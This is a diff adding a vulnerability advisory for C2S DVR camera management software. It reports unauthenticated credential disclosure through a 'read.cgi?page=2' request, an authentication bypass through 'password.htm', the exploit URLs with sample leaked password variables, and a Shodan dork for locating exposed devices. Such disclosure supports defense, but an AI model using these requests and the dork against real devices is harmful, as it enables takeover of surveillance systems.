@@ -1,0 +1,56 @@
+1. Advisory Information
+========================================
+Title                   : C2S DVR Management Remote Credentials Disclosure & Authentication Bypass
+Vendor Homepage         : http://www.cash2s.com/en/
+Remotely Exploitable	: Yes
+Tested on Camera types	: IRDOME-II-C2S, IRBOX-II-C2S, DVR
+Vulnerabilities         : Credentials Disclosure
++                       : Authentication bypass
+Date                    : 19/08/2016
+Shodan Dork             : html:write.cgi "Content-length: 2676"
+Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
+ 
+ 
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test by Yakir Wizman.
+  
+
+3. Description
+========================================
+C2S DVR allows to unauthenticated user disclose the username & password remotely by simple request to the server page 'read.cgi?page=2' which can be made by browser or burp/fiddler.
+Moreover, an attacker could easily access to password change page without any authentication, thats happen cuase the web application does not perform any session management.
+
+
+4. Proof-of-Concept:
+========================================
+Remote Credentials Disclosure:
+-----------------------------------------------
+Simply go to the following url to read the credentials:
+http://host:port/cgi-bin/read.cgi?page=2
+
+Should return some javascript variable which contain the credentials and other configuration vars:
+
+var pw_enflag = "1";
+var pw_adminpw = "12345";
+var pw_retype1 = "12345";
+var pw_userpw = "56789";
+var pw_retype2 = "56789";
+var pw_autolock = "0";
+
+
+Login @ http://host:port/
+-----------------------------------------------
+
+
+Authentication Bypass:
+-----------------------------------------------
+The application does not require a valid session for any page on the server, for example you can access to 'password.htm' which allows you to change/disclose the admin password with just a few clicks.
+
+http://host:port/password.htm?parm1=&parm2=1
+
+
+
+5. SOLUTION
+========================================
+Contact the vendor for further information regarding the proper mitigation of this vulnerability.
